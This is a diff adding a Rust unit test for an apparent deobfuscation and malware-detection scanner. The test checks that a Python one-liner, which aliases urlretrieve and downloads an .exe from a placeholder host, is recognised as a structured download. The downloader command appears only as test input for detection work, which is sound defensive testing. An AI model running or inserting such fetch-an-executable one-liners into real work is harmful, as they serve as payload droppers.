@@ -11231,6 +11231,39 @@ $urlzip = "https://ps.example/stage.zip""#,
     }
 
     #[test]
+    fn python_urllib_multiline_urlretrieve_alias_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            "python -c \"from urllib.request import (\n    urlopen,\n    urlretrieve as grab,\n); grab('https://py.example/multiline-alias-file.exe', 'multi.exe')\"",
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/multiline-alias-file.exe"
+                        && dst.as_deref() == Some("multi.exe")
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python multiline urlretrieve alias: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/multiline-alias-file.exe")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python multiline urlretrieve alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_urllib_request_module_alias_urlretrieve_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
